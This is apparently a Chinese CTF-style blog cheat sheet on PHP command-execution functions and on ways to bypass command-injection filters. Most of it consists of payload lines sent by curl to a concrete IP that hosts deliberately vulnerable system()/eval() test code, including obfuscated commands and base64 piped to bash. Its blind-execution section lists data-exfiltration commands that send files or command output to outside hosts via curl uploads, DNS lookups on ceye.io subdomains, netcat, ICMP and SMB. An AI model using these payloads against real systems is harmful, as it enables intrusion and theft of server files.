<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	passthru(&quot;whoami&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>passthru直接将结果输出到浏览器,并且支持二进制文件，比如图片</p>
<h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a><code>exec()</code></h3><p><code>exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] ) : string</code></p>
<p><code>php -r &quot;echo exec(&#39;whoami&#39;);&quot;</code></p>
<p>不输出结果，如果需要直接获取需要<code>$output</code>参数</p>
<h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()/``"></a><code>shell_exec()/``</code></h3><p><code>shell_exec — 通过 shell</code> 环境执行命令，并且将完整的输出以字符串的方式返回。效果与反引号一样，在安全模式下不起作用。</p>
<p><code>shell_exec ( string $cmd ) : string</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$output = shell_exec($_GET[&apos;a&apos;]);</span><br><span class="line">	echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>?a=whoami<br>不输出结果，如果需要echo</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$output = shell_exec(&apos;ls file_not_exist 2&gt;&amp;1&apos;);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p>将标准错误流输入到标准输出流里输出错误信息</p>
<h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a><code>pcntl_exec()</code></h3><p>pcntl_exec — 在当前进程空间执行指定程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	pcntl_exec( &quot;/bin/bash&quot; , array(&quot;whoami&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我本地ubuntu是没有这个函数的，但是我宝塔里却有，但是我宝塔执行不了这个函数，会报cannot execute binary file。</p>
<h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a><code>popen()</code></h3><p><code>popen</code> — 打开进程文件指针</p>
<p><code>popen ( string $command , string $mode ) : resource</code></p>
<p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。</p>
<p>不能够直接  <code>php -r &#39;print_r(popen(&quot;/bin/ls&quot;, &quot;r&quot;));&#39;</code>，会返回Broken pipe,这个函数返回的是一个resource，我们可以通过fgets/fread函数去读取程序的输出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">	$test = &quot;whoami&quot;;  </span><br><span class="line">	$fp = popen($test,&quot;r&quot;);  //popen打一个进程通道  </span><br><span class="line">  </span><br><span class="line">	while (!feof($fp)) &#123;      //从通道取出内容 </span><br><span class="line">		$out = fgets($fp, 4096);  </span><br><span class="line">		echo  $out;          </span><br><span class="line">	&#125;  </span><br><span class="line">	pclose($fp);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a><code>proc_open()</code></h3><p><code>proc_open</code> — 执行一个命令，并且打开用来输入/输出的文件指针。<br><code>proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] ) : resource</code></p>
<p><code>descriptorspec</code><br>一个索引数组。 数组的键表示描述符，数组元素值表示 PHP 如何将这些描述符传送至子进程。 0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">    0 =&gt; array(&apos;pipe&apos;, &apos;r&apos;),</span><br><span class="line">    1 =&gt; array(&apos;pipe&apos;, &apos;w&apos;), </span><br><span class="line">    2 =&gt; array(&apos;file&apos;, &apos;/dev/shm/error-output.txt&apos;, &apos;a&apos;)</span><br><span class="line">);</span><br><span class="line"> </span><br><span class="line">$process = proc_open(&apos;ls -la&apos;, $descriptorspec, $pipes);</span><br><span class="line"> </span><br><span class="line">if (is_resource($process)) &#123;</span><br><span class="line"> </span><br><span class="line">    $output = stream_get_contents($pipes[1]);</span><br><span class="line"> </span><br><span class="line">    fclose($pipes[0]);</span><br><span class="line">    fclose($pipes[1]);</span><br><span class="line"> </span><br><span class="line">    // 调用proc_close前必须把所有管道先关闭，避免出现死锁</span><br><span class="line">    $retval = proc_close($process);</span><br><span class="line"> </span><br><span class="line">    echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br><span class="line">    echo &apos;&lt;br&gt;Return value: &apos; . $retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="escapeshellcmd-escapeshellarg-（属于命令执行绕过范畴）"><a href="#escapeshellcmd-escapeshellarg-（属于命令执行绕过范畴）" class="headerlink" title="escapeshellcmd()/escapeshellarg()（属于命令执行绕过范畴）"></a><code>escapeshellcmd()</code>/<code>escapeshellarg()</code>（属于命令执行绕过范畴）</h3><p>8.1、<code>escapeshellarg</code> — 把字符串转码为可以在 shell 命令里使用的参数</p>
<p>转义字符串$arg中的单引号并使用单引号包裹此部分</p>
<p>使得$arg只能传递一个参数，且不能执行不同的命令</p>
<p><code>escapeshellarg ( string $arg ) : string</code></p>
<p>8.2、<code>escapeshellcmd</code> — shell 元字符转义</p>
<p><code>escapeshellcmd ( string $command ) : string</code></p>
<p>转义<code>&amp; # ; | * ? ~ &lt; &gt; ^ ( ) [ ] { } $ 、x0A和xF，&#39;和&quot;</code> 仅在落单时被转义</p>
<p>这些都会用^来取消其意义。也就是没办法用&amp; | 来执行其他命令，只能列目录。</p>
<p>以上两个函数都是为了保证命令在经过system以及其他命令执行函数时防止用户输入非法的命令，但是这两个函数并非是万能的，依旧有许多方式进行绕过。<br>1.<code>escapeshellcmd</code>与<code>escapeshellarg</code>同时存在时候可以利用其差异性进行绕过</p>
<h3 id="集合-1"><a href="#集合-1" class="headerlink" title="集合"></a>集合</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,pope,passthru</span><br></pre></td></tr></table></figure>

<h3 id="windows下文件读取"><a href="#windows下文件读取" class="headerlink" title="windows下文件读取"></a>windows下文件读取</h3><p><code>1.more flag.txt</code></p>
<p><code>2.type flag.txt</code></p>
<h3 id="linux下文件读取"><a href="#linux下文件读取" class="headerlink" title="linux下文件读取"></a>linux下文件读取</h3><p><code>1.cat flag.txt /{cat,flag.txt}</code></p>
<p><code>2.more flag.txt</code></p>
<p><code>3.less flag.txt</code></p>
<p><code>4.head flag.txt</code></p>
<p><code>5.tail flag.txt</code></p>
<p><code>6.tac flag.txt</code></p>
<p><code>7.nl flag.txt</code></p>
<p><code>8.od flag.txt</code></p>
<p><code>9.fire flag.txt</code></p>
<p><code>10.wc flag.txt</code></p>
<p><code>11.uniq flag.txt</code></p>
<p><code>12.diff flag.txt flag1.txt</code></p>
<p><code>13.sed -n &#39;1,2p&#39; flag.txt</code></p>
<p><code>14.find -P flag.txt</code></p>
<p><code>15、strings flag.txt</code></p>
<p><code>16、tailf flag.txt</code></p>
<p><code>17、curl file:///root/flag.txt</code></p>
<p><code>18、sort flag.txt</code></p>
<p><code>19、{grep,-nrw,.}</code></p>
<p><code>20、grep -r ..</code></p>
<p><code>21、bash -v flag.txt</code></p>
<p><code>22、rev flag.txt</code></p>
<h3 id="windows-写文件"><a href="#windows-写文件" class="headerlink" title="windows 写文件"></a>windows 写文件</h3><h3 id="linux-写文件"><a href="#linux-写文件" class="headerlink" title="linux 写文件"></a>linux 写文件</h3><p><code>1.tee flag.txt</code></p>
<h2 id="三、命令执行绕过"><a href="#三、命令执行绕过" class="headerlink" title="三、命令执行绕过"></a>三、命令执行绕过</h2><h3 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%0a、%0d    换行符与回车符</span><br><span class="line">|           第一条命令结果作为第二条命令的输入</span><br><span class="line">||          第一条执行失败，执行第二条命令（</span><br><span class="line">;           连续指令功能。</span><br><span class="line">&amp;           连接的两条命令都会执行</span><br><span class="line">&amp;&amp;          当第一条执行成功后执行后续命令</span><br></pre></td></tr></table></figure>

<h3 id="-1"><a href="#-1" class="headerlink" title="${}"></a><code>${}</code></h3><p>值得注意的是在被<code>“”</code>包裹时候直接<code>${}</code>是不可以的，因为PHP将会将它识别为可变变量而不是一个PHP代码。<br>这里有的有趣的发现，在下面已经将<code>phpinfo()</code>声明为可变变量后直接传入cmd=phpinfo()是可以执行的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&quot;cmd&quot;]))&#123;</span><br><span class="line">	$cmd = @(string)$_GET[&quot;cmd&quot;];</span><br><span class="line">	eval(&apos;$cmd=&quot;&apos; . addslashes($cmd) . &apos;&quot;;&apos;);</span><br><span class="line">	echo &apos;$cmd=&quot;&apos; . addslashes($cmd) . &apos;&quot;;&apos;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">	echo &apos;hello&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$a=$&#123;phpinfo()&#125;;</span><br></pre></td></tr></table></figure>

<p>当然对于<code>${}</code>来说会识别里面包含的第一个字符，只要将第一个字符修改为如<code>空格，tab，注释，回车</code>就会避免被直接当成变量，而会将其执行为PHP代码。</p>
<p>附上其他师傅总结payload</p>
<p>php &gt;= 4.3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&quot;$&#123; phpinfo()&#125;&quot;;</span><br><span class="line">&quot;$&#123;    phpinfo()&#125;&quot;;</span><br><span class="line">&quot;$&#123;/**/phpinfo()&#125;&quot;;</span><br><span class="line">&quot;$&#123;</span><br><span class="line">phpinfo()&#125;&quot;;</span><br><span class="line">&quot;$&#123;@phpinfo()&#125;&quot;;</span><br><span class="line"></span><br><span class="line">&quot;$&#123;( string )phpinfo()&#125;&quot;;</span><br><span class="line">&quot;$&#123;phpinfo[phpinfo()]&#125;&quot;;</span><br><span class="line"></span><br><span class="line">&quot;&#123;$phpinfo[phpinfo()]&#125;&quot;;</span><br><span class="line">&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;;</span><br><span class="line">&quot;$&#123;$&#123;phpinfo()&#125;&#125;&quot;;</span><br></pre></td></tr></table></figure>

<p>php&gt;=5.5</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;$&#123;phpinfo()&#125;&quot;;</span><br></pre></td></tr></table></figure>

<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>测试代码，该目录下还有一个flag.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(isset($_GET[&apos;museljh&apos;]))&#123;</span><br><span class="line">  $muse=$_GET[&apos;museljh&apos;];</span><br><span class="line">  system($muse);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	echo &apos;no!no!no!&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原来的命令<br><code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat flag.txt&quot;</code><br>绕过空格</p>
<p>1.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat%09flag.txt&quot;</code></p>
<p>2.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh={ls,-l}&quot;</code></p>
<p>3.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat&lt;&gt;flag.txt&quot;</code></p>
<p>4.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat&lt;flag.txt&quot;</code></p>
<p>5.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat${IFS}flag.txt&quot;</code>（这个记得要url编码下</p>
<p>6.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat$IFS$9flag.txt&quot;</code>（url编码下,$9是linux系统shell进程的第九个参数，始终为空字符串</p>
<p>7.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat$IFS\flag.txt&quot;</code><br>备注：按道理来说<code>curl -G --data-urlencode &quot;museljh=cat flag.txt&quot; http://120.77.176.168/test.php</code>这样是可以直接urlencode编码的，但是却不行。</p>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="/绕过"></a>/绕过</h3><p>首先我们先知道一些小知识</p>
<p><code>echo ${PATH}</code>在我环境中输出为</p>
<p><code>/opt/Java/bin:/opt/Java/jre/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$JAVA_HOME/bin:/home/taoyx/program_develop/go_demo:/usr/local/go/bin</code><br><code>${PATH:0:1}</code>代表以上字符的第一个也就是/,这样我们就可以得到了，当然我感觉这样的方法应该还有很多，指不止PATH，</p>
<p>当然这也可以使用正则匹配，比如<code>${PATH%%o*}</code> <code>%%o.*</code> 表示从右向左匹配 <code>o.*</code> 并删除,这样就不用：。</p>
<p>同样的知识点<code>${PATH##*.}</code>表示非贪婪匹配，当然这个还有许多玩法就不一一说了。</p>
<p><code>echo ${LESSOPEN}</code><br><code>| /usr/bin/lesspipe %s</code></p>
<h3 id="加号-大于号绕过"><a href="#加号-大于号绕过" class="headerlink" title="加号/大于号绕过"></a>加号/大于号绕过</h3><p>PS1——默认提示符</p>
<p>PS2——再谈提示符</p>
<p>PS3——Shell脚本中使用select时的提示符</p>
<p>PS4——PS4-“set -x”用来修改跟踪输出的前缀</p>
<p><code>$PS4</code> 为 +号</p>
<p><code>$PS2</code> 为大于号</p>
<h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h4 id="1-通配符利用"><a href="#1-通配符利用" class="headerlink" title="1.通配符利用"></a>1.通配符利用</h4><p>1.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=/???/?at flag.txt&quot;</code></p>
<p>突然想到一个小结合</p>
<p><code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=${PATH:0:1}???${PATH:0:1}?at%09flag.txt&quot;</code><br>2.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=cat flag*&quot;</code></p>
<h4 id="夹杂字符"><a href="#夹杂字符" class="headerlink" title="夹杂字符"></a>夹杂字符</h4><p>1.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ca&#39;&#39;t flag.txt&quot;</code></p>
<p>2.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ca$1t flag.txt&quot;</code>(这里的1可以改成任何一位数字)</p>
<p>3.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ca\t flag.txt&quot;</code></p>
<p>4.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ca${x}t flag.txt&quot;</code></p>
<p>5.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ca``t flag.txt&quot;</code></p>
<p>6.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ca&quot;&quot;t flag.txt&quot;</code></p>
<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>1.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=echo \&quot;63617420666c61672e747874\&quot;|xxd -r -p|bash&quot;</code> (十六进制我本地莫名不行)</p>
<p>2.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=echo \&quot;Y2F0IGZsYWcudHh0\&quot;|base64 -d|bash&quot;</code></p>
<p>结合一波</p>
<p><code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=echo%09\&quot;Y2F0IGZsYWcudHh0\&quot;|base64%09-d|bash&quot;</code></p>
<h4 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h4><p>1.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=a=cat;b=flag.txt;$a $b;&quot;</code></p>
<p>若;被过滤还可以用%0a,%0d 代替</p>
<p>2.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=a=cat%0ab=flag.txt%0a$a $b%0a&quot;</code></p>
<h4 id="多条命令执行"><a href="#多条命令执行" class="headerlink" title="多条命令执行"></a>多条命令执行</h4><p>1.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=curl 127.0.0.1|ls&quot;</code></p>
<p>2.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ls||curl 127.0.0.1&quot;</code></p>
<p>前面命令执行失败才会执行后面命令</p>
<p>3.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ls&amp;curl 127.0.0.1&quot;</code></p>
<p>命令同时执行 </p>
<p>4.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ls&amp;&amp;curl 127.0.0.1&quot;</code></p>
<p>只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才会被执行。</p>
<p>5.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=ls;curl 127.0.0.1&quot;</code></p>
<p>不管前面命令执行成功没有，后面的命令继续执行 </p>
<h4 id="ip中-绕过"><a href="#ip中-绕过" class="headerlink" title="ip中.绕过"></a>ip中.绕过</h4><p>将ip地址转换为数字地址</p>
<h4 id="巧借全局变量"><a href="#巧借全局变量" class="headerlink" title="巧借全局变量"></a>巧借全局变量</h4><p>上次一个比赛中学到的。<br>在如下条件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(isset($_GET[&apos;museljh&apos;]))&#123;</span><br><span class="line">  $muse=$_GET[&apos;museljh&apos;];</span><br><span class="line">  echo $muse,PHP_EOL;</span><br><span class="line">  #system($muse);</span><br><span class="line"> # system($_GET[&apos;b&apos;]);</span><br><span class="line"> eval($muse); </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	echo &apos;no!no!no!&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.<code>curl -w &quot;\n&quot; &quot;http://120.77.176.168/test.php?museljh=$pi=base_convert(9911,10,28);base_convert(1751504350,10,36)($pi(99).$pi(97).$pi(116).$pi(32).$pi(42)); &quot;</code></p>
<p><code>system(&#39;cat /*&#39;);</code></p>
<ol start="2">
<li><code>curl -l -w &#39;\n&#39; --header &#39;9: ls&#39;  &#39;http://120.77.176.168/test.php?museljh=system(getallheaders()\{9\});&#39;</code></li>
</ol>
<p><code>system(getallheaders(){9})</code></p>
<p>3.<code>GET/POST</code></p>
<h2 id="四、无回显命令执行"><a href="#四、无回显命令执行" class="headerlink" title="四、无回显命令执行"></a>四、无回显命令执行</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>万金油一般的存在，我之前已经写过一篇对此的小总结了。</p>
<h3 id="curl-T-museljh-txt-http-120-77-176-168-11122"><a href="#curl-T-museljh-txt-http-120-77-176-168-11122" class="headerlink" title="curl -T museljh.txt http://120.77.176.168:11122"></a><code>curl -T museljh.txt http://120.77.176.168:11122</code></h3><p>补充下ftp<code>curl –T {path to file} ftp://xxx.xxx.xxx.xxx –user {username}:{museljh}</code></p>
<p>备注：对于curl来说 -F 以及–data来说都默认改为POST请求方式</p>
<h3 id="curl-quot-http-120-77-176-168-11122-quot-data-binary-quot-museljh-txt-quot"><a href="#curl-quot-http-120-77-176-168-11122-quot-data-binary-quot-museljh-txt-quot" class="headerlink" title="curl &quot;http://120.77.176.168:11122&quot; --data-binary &quot;@museljh.txt&quot;"></a><code>curl &quot;http://120.77.176.168:11122&quot; --data-binary &quot;@museljh.txt&quot;</code></h3><h3 id="ping-whoami-ceye-io"><a href="#ping-whoami-ceye-io" class="headerlink" title="ping `whoami`.**.ceye.io"></a>ping `whoami`.<strong>**</strong>.ceye.io</h3><p>ceye.io是一个免费的DNS解析平台，会给每个注册用户一个免费的子域名同构构造类似ping `whoami`.<strong>**</strong>.ceye.io，命令可以将我们得到的结果传递给四级子域名，在ceye.io平台中就可以看到我们的DNS解析记录，嗯，有空再写篇博客研究下DNS隧道技术。这里不得不提下我看到的一个师傅文章中的一个操作，因为域名不能带空格，我们可以使用sed进行替换</p>
<p><code>格式：sed &#39;s/要替换的字符串/新的字符串/g&#39;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `cat flag.txt|sed s/[[:space:]]/xx/g`.museljh.ceye.io</span><br></pre></td></tr></table></figure>

<p>这里还有要注意的，因为不仅仅是空格DNS解析的时候还是有挺多符号是不能解析的比如&#39;,不过要替换的东西可以用正则表示。（按道理来说一般flag里应该也没有什么特殊字符）</p>
<p>不过就算有多个我们也是可以绕过了，我暂时只想到这样的方法,办法确实是笨了点。不知道有没有师傅有更好办法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `cat museljh.txt|sed s/[[:space:]]/museljh/g|sed s/\&apos;/museljh/g`.8itzz8.ceye.io</span><br></pre></td></tr></table></figure>

<h3 id="curl-http-8itzz8-ceye-io-whoami"><a href="#curl-http-8itzz8-ceye-io-whoami" class="headerlink" title="curl http://8itzz8.ceye.io/`whoami`"></a>curl <code>http://8itzz8.ceye.io/</code>`whoami`</h3><p>和第3点原理一样只是换成curl而已,除此之外在ceye.io平台中还提供了sql等payload可以说是很赞的了。</p>
<h3 id="nc-l-p-11122-lt-museljh-txt，curl-http-120-x-176-x-11122"><a href="#nc-l-p-11122-lt-museljh-txt，curl-http-120-x-176-x-11122" class="headerlink" title="nc -l -p 11122 &lt;  museljh.txt，curl http://120.x.176.x:11122"></a><code>nc -l -p 11122 &lt;  museljh.txt</code>，<code>curl http://120.x.176.x:11122</code></h3><p>使用nc将文件重定向到监听端，我们访问这个监听端即可</p>
<h3 id="wget-header-quot-museljh-cat-flag-txt-quot-http-120-77-176-168-11122"><a href="#wget-header-quot-museljh-cat-flag-txt-quot-http-120-77-176-168-11122" class="headerlink" title="wget --header=&quot;museljh:cat flag.txt&quot; http://120.77.176.168:11122"></a><code>wget --header=&quot;museljh:</code>cat flag.txt<code>&quot; http://120.77.176.168:11122</code></h3><h3 id="cat-flag-txt-xxd-p-c-16-while-read-exfil-do-ping-p-exfil-c-1-127-0-0-1-done"><a href="#cat-flag-txt-xxd-p-c-16-while-read-exfil-do-ping-p-exfil-c-1-127-0-0-1-done" class="headerlink" title="cat flag.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 127.0.0.1; done"></a><code>cat flag.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 127.0.0.1; done</code></h3><p>使用ICMP，可以看日志，可以用tcpdump抓包。<br>收到启发，同样想到可以这样</p>
<p><code>cat flag.txt |sed s/[[:space:]]/xx/g|while read museljh; do curl http://120.77.176.168:11122/?id=$museljh; done</code></p>
<p>这样,这里是可以不用使用空格的，我这边sed是多余的。使用类似这样的方法就可以解决之前DNS解析无法使用空格等非法字符了。</p>
<p><code>cat flag.txt |sed s/[[:space:]]/xx/g| xxd -p -c 16 | while read museljh; do curl http://120.77.176.168:11122/?id=$museljh; done</code></p>
<p>以下是我没试过的，只是列出来</p>
<h3 id="net-use-h-xxx-xxx-xxx-xxx-web-user-username-museljh-amp-amp-copy-File-to-Copy-h-filename-txt"><a href="#net-use-h-xxx-xxx-xxx-xxx-web-user-username-museljh-amp-amp-copy-File-to-Copy-h-filename-txt" class="headerlink" title="net use h: \\xxx.xxx.xxx.xxx\web /user:{username} {museljh} &amp;&amp; copy {File to Copy} h:\{filename}.txt"></a><code>net use h: \\xxx.xxx.xxx.xxx\web /user:{username} {museljh} &amp;&amp; copy {File to Copy} h:\{filename}.txt</code></h3><h3 id="telnet-xxx-xxx-xxx-xxx-port-lt-file-to-transfer"><a href="#telnet-xxx-xxx-xxx-xxx-port-lt-file-to-transfer" class="headerlink" title="telnet xxx.xxx.xxx.xxx {port} &lt; {file to transfer}"></a><code>telnet xxx.xxx.xxx.xxx {port} &lt; {file to transfer}</code></h3><p>总的来说还是反弹shell比较合算</p>
<h2 id="五、畸变的webshell"><a href="#五、畸变的webshell" class="headerlink" title="五、畸变的webshell"></a>五、畸变的webshell</h2><h2 id="六、PHP文件读取函数"><a href="#六、PHP文件读取函数" class="headerlink" title="六、PHP文件读取函数"></a>六、PHP文件读取函数</h2><h3 id="集合-2"><a href="#集合-2" class="headerlink" title="集合"></a>集合</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents（）、highlight_file（）、fopen（）、readfile（）、fread（）、fgetss（）、fgets（）、parse_ini_file（）、show_source（）、file（）</span><br></pre></td></tr></table></figure>

<h2 id="七、PHP输出当前进程所有变量-常量-模块-函数-类"><a href="#七、PHP输出当前进程所有变量-常量-模块-函数-类" class="headerlink" title="七、PHP输出当前进程所有变量 / 常量 / 模块 / 函数 / 类"></a>七、PHP输出当前进程所有变量 / 常量 / 模块 / 函数 / 类</h2><h3 id="get-defined-functions"><a href="#get-defined-functions" class="headerlink" title="get_defined_functions()"></a><code>get_defined_functions()</code></h3><p><code>get_defined_functions</code> — 返回所有已定义函数的数组<br><code>get_defined_functions ([ bool $exclude_disabled = FALSE ] ) : array</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function myrow($id, $data)</span><br><span class="line">&#123;</span><br><span class="line">    return &quot;&lt;tr&gt;&lt;th&gt;$id&lt;/th&gt;&lt;td&gt;$data&lt;/td&gt;&lt;/tr&gt;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$arr = get_defined_functions();</span><br><span class="line"></span><br><span class="line">print_r($arr);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a><code>get_defined_vars()</code></h3><p><code>get_defined_vars</code> — 返回由所有已定义变量所组成的数组</p>
<p><code>get_defined_vars ( void ) : array</code></p>
<p>此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p>
